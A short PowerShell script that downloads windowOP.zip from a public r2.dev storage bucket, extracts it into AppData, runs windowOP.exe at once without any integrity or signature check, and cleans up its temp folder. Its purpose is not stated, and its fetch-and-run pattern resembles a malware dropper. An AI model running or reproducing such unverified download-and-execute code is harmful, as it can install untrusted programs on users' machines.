$tempFolderName = [guid]::NewGuid().ToString()
$tempFolderPath = Join-Path $env:TEMP $tempFolderName
$targetPath = Join-Path $env:APPDATA "windowOP"
$exePath = Join-Path $targetPath "windowOP.exe"

New-Item $tempFolderPath -ItemType Directory -Force | Out-Null

try {
    $zipPath = Join-Path $tempFolderPath "windowOP.zip"
    (New-Object Net.WebClient).DownloadFile("https://pub-7dd52c97b3004fe49470275bb0fb33ee.r2.dev/windowOP.zip", $zipPath)
    
    if (Test-Path $targetPath) { Remove-Item $targetPath -Recurse -Force }
    Expand-Archive $zipPath $targetPath -Force
    & $exePath @args
} finally {
    if (Test-Path $tempFolderPath) { Remove-Item $tempFolderPath -Recurse -Force }
}